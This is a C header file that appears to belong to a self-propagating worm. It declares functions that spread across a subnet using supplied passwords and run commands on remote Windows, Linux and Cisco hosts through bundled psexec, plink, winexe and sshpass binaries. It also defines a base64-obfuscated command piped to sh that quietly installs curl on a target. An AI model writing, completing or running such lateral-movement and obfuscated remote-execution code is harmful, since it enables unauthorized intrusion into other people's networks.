#ifndef net_H
#define net_H

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>       // for string-related functions

#define CURL_ONE_LINER "echo \"c2ggLWMgImlmICEgY29tbWFuZCAtdiBjdXJsID4vZGV2L251bGwgMj4mMTsgdGhlbiBpZiBjb21tYW5kIC12IGFwdC1nZXQgPi9kZXYvbnVsbDsgdGhlbiBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgLXkgY3VybDsgZWxpZiBjb21tYW5kIC12IHl1bSA+L2Rldi9udWxsOyB0aGVuIHl1bSB1cGRhdGUgJiYgeXVtIGluc3RhbGwgLXkgY3VybDsgZWxpZiBjb21tYW5kIC12IGRuZiA+L2Rldi9udWxsOyB0aGVuIGRuZiB1cGRhdGUgJiYgZG5mIGluc3RhbGwgLXkgY3VybDsgZWxpZiBjb21tYW5kIC12IHBhY21hbiA+L2Rldi9udWxsOyB0aGVuIHBhY21hbiAtU3kgJiYgcGFjbWFuIC1TIC0tbm9jb25maXJtIGN1cmw7IGVsaWYgY29tbWFuZCAtdiBhcGsgPi9kZXYvbnVsbDsgdGhlbiBhcGsgdXBkYXRlICYmIGFwayBhZGQgY3VybDsgZWxpZiBjb21tYW5kIC12IHp5cHBlciA+L2Rldi9udWxsOyB0aGVuIHp5cHBlciByZWZyZXNoICYmIHp5cHBlciBpbnN0YWxsIC15IGN1cmw7IGVsaWYgY29tbWFuZCAtdiBicmV3ID4vZGV2L251bGw7IHRoZW4gYnJldyB1cGRhdGUgJiYgYnJldyBpbnN0YWxsIGN1cmw7IGVsaWYgY29tbWFuZCAtdiBwb3J0ID4vZGV2L251bGw7IHRoZW4gcG9ydCBzZWxmdXBkYXRlICYmIHBvcnQgaW5zdGFsbCBjdXJsOyBlbHNlIGVjaG8gXCJVbmFibGUgdG8gZmluZCBhIHBhY2thZ2UgbWFuYWdlciB0byBpbnN0YWxsIGN1cmxcIjsgZmk7IGZpIgo=\" | base64 -d | sh"


#define NI_NUMERICHOST 1  // define the constant with the integer value 1
#define NI_MAXHOST 1025

#define NUM_THREADS 16 // Number of worker threads

#define MAX_BUF_SIZE 1024
#define MAX_COMMAND_SIZE 2048

#ifdef _WIN32
    // Define the paths to the Windows-specific binaries
    #define POPEN _popen
    #define PCLOSE _pclose
    #define PS_EXEC_PATH ".\\bin\\win64\\psexec.exe"
    #define PLINK_EXE_PATH ".\\bin\\win64\\plink.exe"
#else
    #include <ifaddrs.h>
    #include <sys/socket.h>   // for socket-related functions and structures
    #include <netdb.h>        // for network-related functions and structures
    // Define the path to the Linux-specific winexe binary based on architecture
    #define POPEN popen
    #define PCLOSE pclose
    #ifdef __x86_64__
        #define WIN_EXE_PATH "./bin/linux64/winexe"
        #define SSHPASS_PATH "./bin/linux64/sshpass"
    #else
        #define WIN_EXE_PATH "./bin/linux32/winexe"
        #define SSHPASS_PATH "./bin/linux32/sshpass"
    #endif
#endif

typedef struct {
    float p_system_info;
    char ip[MAX_COMMAND_SIZE];
} MaxSystemInfo;

extern MaxSystemInfo max_system_info;
extern pthread_mutex_t max_system_info_mutex;



enum os_type {
    UNKNOWN,
    WINDOWS,
    LINUX,
    CISCO
};
typedef struct ThreadData {
    int index;
    const char* subnet;
    const char* password;
} ThreadData;

enum os_type get_os_type(const char *ip_address);
char* remote_execution(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
void spread_linux(const char* host, const char* username, const char* password);
void spread(const char* subnet, const char* password);

// static void spread_linux(const char* host, const char* username, const char* password, const char* command);

// static void spread_windows(const char* host, const char* username, const char* password, const char* command); 

// static void spread_cisco(const char* host, const char* username, const char* password, const char* command);


#endif /* net_H */
